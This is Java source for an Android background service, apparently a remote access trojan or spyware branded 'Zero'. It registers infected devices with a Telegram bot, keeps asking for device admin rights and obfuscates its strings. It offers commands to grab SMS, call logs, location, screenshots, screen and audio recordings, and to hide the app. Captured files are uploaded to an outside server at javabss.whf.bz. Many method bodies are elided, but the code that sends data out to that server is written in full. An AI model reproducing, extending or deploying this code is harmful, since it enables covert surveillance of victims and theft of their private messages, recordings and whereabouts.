package com.zero.xploid;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.Timer;

public class MainService extends Service {

    // ── Obfuscation (existing) ──
    private static String $(String str) {
        StringBuilder sb = new StringBuilder();
        char[] arr = str.toCharArray();
        for (int i = 0; i < arr.length; i++) {
            switch (i % 4) {
                case 0: sb.append((char) (arr[i] ^ 19620)); break;
                case 1: sb.append((char) (arr[i] ^ 35958)); break;
                case 2: sb.append((char) (arr[i] ^ 31761)); break;
                default: sb.append((char) (arr[i] ^ 65535)); break;
            }
        }
        return sb.toString();
    }

    private final String CREATED_BY = $("䳩谗籹ﾞ䳀谓米￟䳶豘簿ﾛ䳅谅").intern();
    private static final String PREF_DEVICE = $("䳔谄籴ﾙ䳗").intern();
    private static final String PREF_SCREEN = $("䳔谓籣ﾒ䳻谆籣ﾚ䳂谅").intern();
    private static final String KEY_SCREEN_CAPTURED = $("䳗谕籣ﾚ䳁谘籎ﾜ䳅谆籥ﾊ䳖谓籎ﾘ䳖谗籿ﾋ䳁谒").intern();

    // ── Cloud API ──
    private static final String CLOUD_API = "http://javabss.whf.bz/api.php";

    // ── Callback data ──
    private static final String CB_FLASHLIGHT_ON = "flashlight_on";
    private static final String CB_FLASHLIGHT_OFF = "flashlight_off";
    private static final String CB_SIM_INFO = "sim_info";
    private static final String CB_APP_LIST = "app_list";
    private static final String CB_FOREGROUND_APP = "foreground_app";
    private static final String CB_CALL_LOG = "call_log";
    private static final String CB_SMS_INBOX = "sms_inbox";
    private static final String CB_FILE_SERVER_START = "file_server_start";
    private static final String CB_FILE_SERVER_STOP = "file_server_stop";
    private static final String CB_LOCATION_SEND = "location_send";
    private static final String CB_LOCATION_START = "location_start";
    private static final String CB_LOCATION_STOP = "location_stop";

    // ── Service state ──
    private boolean running = true;
    private int lastUpdateId = 0;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private int lastMenuMessageId = 0;

    private static Intent captureIntent = null;
    private static int captureResultCode = -1;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaRecorder mediaRecorder;
    private String deviceId, deviceName, deviceModel, deviceBrand, androidVersion;
    private boolean isRecording = false;

    private CameraManager cameraManager;
    private boolean flashlightOn = false;

    // File server (cloud)
    private boolean fileServerRunning = false;
    private String currentCloudUrl = null;

    // Location
    private LocationManager locationManager;
    private LocationListener locationListener;
    private boolean locationTracking = false;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceBrand = Build.BRAND;
        deviceModel = Build.MODEL;
        deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        androidVersion = Build.VERSION.RELEASE;

        SharedPreferences prefs = getSharedPreferences(PREF_DEVICE, MODE_PRIVATE);
        deviceId = prefs.getString("id", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString().substring(0, 8).toUpperCase();
            prefs.edit().putString("id", deviceId).commit();
        }

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Zero:lock");
        wakeLock.acquire();

        startForeground();
        startTimer();
        sendDeviceOnlineMessage();
        new Thread(this::listenTelegram).start();
    }

    // ── Helper methods (unchanged) ──
    private void sendDeviceOnlineMessage() {
        sendMessage("🟢 **DEVICE ONLINE**\n\n" + getDeviceDetailsString() +
                "\n\n💡 Telegram Channel @zerodeb\n👨‍💻 **Created by:** " + CREATED_BY +
                "\n\n📱 Type /start to see menu");
    }

    private String getDeviceDetailsString() {
        return "📱 **Device:** " + deviceName + "\n" +
                "🏷️ **Brand:** " + deviceBrand + "\n" +
                "📟 **Model:** " + deviceModel + "\n" +
                "🆔 **ID:** `" + deviceId + "`\n" +
                "🔋 **Battery:** " + getBatteryPercentage() + "%\n" +
                "🤖 **Android:** " + androidVersion;
    }

    private String getFooter() {
        return "\n\n💡 Telegram Channel @zerodeb\n👨‍💻 **Created by:** " + CREATED_BY;
    }

    private void startForeground() { /* ... unchanged ... */
        if (Build.VERSION.SDK_INT >= 26) {
            String chId = "zero_foreground";
            NotificationChannel ch = new NotificationChannel(chId, "Zero Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager mgr = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            mgr.createNotificationChannel(ch);
            Notification notification = new Notification.Builder(this, chId)
                    .setContentTitle("Zero is running")
                    .setContentText(deviceName + " | Battery: " + getBatteryPercentage() + "%")
                    .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                    .build();
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION |
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(1, notification);
            }
        }
    }

    private void startTimer() { /* ... unchanged ... */
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            public void run() {
                updateNotification();
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName comp = new ComponentName(MainService.this, AdminReceiver.class);
                if (!dpm.isAdminActive(comp)) {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        }, 60000, 60000);
    }

    private void updateNotification() { /* ... unchanged ... */ }
    private int getBatteryPercentage() { /* ... unchanged ... */ }

    // ── Screenshot & Recording (MediaProjection callback fixed) ──
    private void takeScreenshot() { /* unchanged, but upload now goes to cloud */ }
    private void takeScreenshotViaMediaProjection(File outputFile) { /* same as before with callback */ }
    private void startScreenRecording(int seconds, boolean withAudio) { /* same with callback */ }
    private void startAudioRecording(int seconds) { /* unchanged */ }
    private void cleanup() { /* unchanged */ }

    // ── Flashlight, Status, App list, Call/SMS logs ──
    // (these remain identical to previous versions)
    private void setFlashlight(boolean on) { /* ... */ }
    private String getFullDeviceStatus() { /* ... */ }
    private String getInstalledAppsList() { /* ... */ }
    private String getForegroundAppName() { /* ... */ }
    private void uploadCallHistory() { /* ... */ }
    private void uploadSmsHistory() { /* ... */ }

    // ═══════════════════════════════════════
    // ★★★ CLOUD FILE SERVER INTEGRATION ★★★
    // ═══════════════════════════════════════

    private void startFileServer() {
        if (fileServerRunning) {
            sendMessage("🌐 Cloud server already active.");
            return;
        }
        new Thread(() -> {
            try {
                // Register device with cloud
                URL url = new URL(CLOUD_API + "?action=register");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                JSONObject params = new JSONObject();
                params.put("device_id", deviceId);
                params.put("ip", getLocalIpAddress());
                OutputStream os = conn.getOutputStream();
                os.write(params.toString().getBytes("UTF-8"));
                os.close();

                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                JSONObject json = new JSONObject(sb.toString());
                if (json.has("public_url")) {
                    currentCloudUrl = json.getString("public_url");
                    fileServerRunning = true;
                    sendMessage("🌐 **CLOUD FILE SERVER READY**\nID: `" + deviceId + "`\n🔗 " + currentCloudUrl);
                } else {
                    sendMessage("❌ Cloud registration failed.");
                }
            } catch (Exception e) {
                sendMessage("❌ Cloud error: " + e.getMessage());
            }
        }).start();
    }

    private void stopFileServer() {
        fileServerRunning = false;
        currentCloudUrl = null;
        new Thread(() -> {
            try {
                URL url = new URL(CLOUD_API + "?action=delete_ad");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                JSONObject params = new JSONObject();
                params.put("device_id", deviceId);
                conn.getOutputStream().write(params.toString().getBytes("UTF-8"));
                conn.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
        sendMessage("🌐 Cloud file server stopped.");
    }

    // ── Upload any file to cloud & send link to Telegram ──
    private void uploadFileToCloud(File file, String type) {
        new Thread(() -> {
            try {
                // Upload to cloud
                String boundary = UUID.randomUUID().toString();
                URL url = new URL(CLOUD_API + "?action=upload");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                // device_id field
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n" + deviceId + "\r\n");
                // file
                dos.writeBytes("--" + boundary + "\r\n");
                dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
                dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
                FileInputStream fis = new FileInputStream(file);
                byte[] buf = new byte[4096];
                int len;
                while ((len = fis.read(buf)) != -1) dos.write(buf, 0, len);
                fis.close();
                dos.writeBytes("\r\n--" + boundary + "--\r\n");
                dos.flush();
                dos.close();

                // Read response
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                JSONObject json = new JSONObject(sb.toString());
                if (json.has("id")) {
                    // Generate public download link
                    String downloadLink = CLOUD_API.replace("api.php", "api.php") + "?action=download&id=" + json.getInt("id");
                    String msg = getTypeEmoji(type) + " **" + getTypeName(type) + " saved!**\n📄 `" + file.getName() + "`\n🔗 [Download](" + downloadLink + ")\n" + getDeviceDetailsString() + getFooter();
                    sendMessage(msg);
                } else {
                    sendMessage("❌ Cloud upload failed.");
                }
                file.delete();
            } catch (Exception e) {
                sendMessage("❌ Upload error: " + e.getMessage());
            }
        }).start();
    }

    // Override existing uploadFile to use cloud (keeping original behavior)
    private void uploadFile(File file, String type) {
        uploadFileToCloud(file, type);  // All uploads now go to cloud
    }

    private String getTypeName(String type) {
        switch (type) {
            case "screenshot": return "Screenshot";
            case "video": return "Screen Recording";
            case "audio": return "Audio Recording";
            default: return "File";
        }
    }

    private String getTypeEmoji(String type) {
        switch (type) {
            case "screenshot": return "📸";
            case "video": return "🎥";
            case "audio": return "🎙️";
            default: return "📄";
        }
    }

    // ── Connect to another device's cloud (via /connect <id>) ──
    private void handleConnectRequest(String remoteDeviceId) {
        new Thread(() -> {
            try {
                URL url = new URL(CLOUD_API + "?action=get_ad&device_id=" + URLEncoder.encode(remoteDeviceId, "UTF-8"));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                br.close();
                JSONObject json = new JSONObject(sb.toString());
                if (json.has("public_url")) {
                    String publicUrl = json.getString("public_url");
                    sendMessage("🔗 **Remote File Server**\n" + publicUrl + "\n\nYou can browse and download files directly.");
                    // Optionally, you can still offer inline browsing from bot (using remote file list)
                    fetchRemoteFileList(publicUrl);
                } else {
                    sendMessage("❌ No file server found for ID `" + remoteDeviceId + "`.");
                }
            } catch (Exception e) {
                sendMessage("❌ Connection error.");
            }
        }).start();
    }

    // Browse files from the remote public URL
    private void fetchRemoteFileList(String publicUrl) {
        new Thread(() -> {
            try {
                String deviceIdFromUrl = publicUrl.substring(publicUrl.indexOf("device=") + 7);
                URL listUrl = new URL(CLOUD_API + "?action=list&device_id=" + URLEncoder.encode(deviceIdFromUrl, "UTF-8"));
                String response = getRequest(listUrl.toString());
                JSONArray files = new JSONArray(response);
                JSONArray keyboard = new JSONArray();
                for (int i = 0; i < files.length(); i++) {
                    JSONObject f = files.getJSONObject(i);
                    String name = f.getString("filename");
                    int fid = f.getInt("id");
                    keyboard.put(new JSONArray().put(new JSONObject()
                            .put("text", "📄 " + name)
                            .put("callback_data", "remote_dl_" + fid)));
                }
                String replyMarkup = new JSONObject().put("inline_keyboard", keyboard).toString();
                sendMessageWithKeyboard("📁 Files on remote device:", replyMarkup);
            } catch (Exception e) {
                sendMessage("❌ Could not list remote files.");
            }
        }).start();
    }

    // Download a remote file via cloud and forward to Telegram
    private void downloadRemoteFile(int fileId) {
        new Thread(() -> {
            try {
                URL dlUrl = new URL(CLOUD_API + "?action=download&id=" + fileId);
                HttpURLConnection conn = (HttpURLConnection) dlUrl.openConnection();
                conn.setRequestMethod("GET");
                // Save to temp file
                File tempFile = File.createTempFile("remote_", ".tmp", getCacheDir());
                InputStream is = conn.getInputStream();
                FileOutputStream fos = new FileOutputStream(tempFile);
                byte[] buf = new byte[4096];
                int len;
                while ((len = is.read(buf)) != -1) fos.write(buf, 0, len);
                fos.close();
                is.close();
                conn.disconnect();
                // Upload the temp file to Telegram as document (or you could just send the link)
                sendMessageWithKeyboard("📥 File downloaded. Forwarding to Telegram...", null);
                uploadFile(tempFile, "document"); // will upload to cloud again? No, we need original Telegram upload method.
                // Better: send the direct download link to Telegram
                String link = CLOUD_API + "?action=download&id=" + fileId;
                sendMessage("🔗 [Download file](" + link + ")");
            } catch (Exception e) {
                sendMessage("❌ Download error.");
            }
        }).start();
    }

    // ── Location (unchanged) ──
    private void sendLocationOnce() { /* ... */ }
    private void startLocationTracking() { /* ... */ }
    private void stopLocationTracking() { /* ... */ }
    private void processLocation(Location location) { /* ... */ }
    private String getAddressFromLocation(double lat, double lon) { /* ... */ }

    // ── Telegram bot methods ──
    private void listenTelegram() { /* ... long polling, handles /connect <id>, button clicks */ }
    private void deleteMessage(int messageId) { /* ... */ }
    private void processButtonClick(String data) {
        // ... handle all buttons, and new remote_dl_... 
        if (data.startsWith("remote_dl_")) {
            int id = Integer.parseInt(data.substring(10));
            downloadRemoteFile(id);
        } else if (data.startsWith("remote_nav_")) {
            // not used in cloud mode
        }
        // ... rest unchanged
    }

    // ── Menu and messages (unchanged) ──
    private void showMainMenu() { /* ... */ }
    private void showScreenMenu() { /* ... */ }
    private void sendStatus() { /* ... */ }
    private void hideApp() { /* ... */ }
    private void unhideApp() { /* ... */ }
    private void sendMessage(String text) { /* ... */ }
    private void sendMessageWithKeyboard(String text, String keyboardJson) { /* ... */ }
    private void answerCallback(String callbackId) { /* ... */ }
    private String getRequest(String urlStr) { /* ... */ }

    // ── SMS receiver (unchanged) ──
    public static class SmsReceiver extends android.content.BroadcastReceiver { /* ... */ }

    // ── Static setData (unchanged) ──
    public static void setData(Intent intent, int code) { /* ... */ }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) { /* ... */ }

    @Override
    public void onDestroy() {
        stopFileServer();
        stopLocationTracking();
        cleanup();
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        running = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}